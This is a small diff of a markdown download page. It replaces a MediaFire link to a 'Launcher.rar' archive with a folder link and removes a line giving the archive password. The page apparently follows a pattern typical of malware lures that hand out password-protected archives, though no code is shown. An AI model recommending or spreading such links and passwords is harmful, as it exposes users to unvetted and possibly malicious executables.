@@ -1,6 +1,5 @@
-# 📁[Click To Download](https://www.mediafire.com/file/dbh3fy10smopf6y/Launcher.rar/file)
+# 📁[Click To Download](https://www.mediafire.com/folder/frdmuiawu3i6g)
 
-# 🔓 Archive Pass: LOAD12121
 
 ## System Requirements:
 
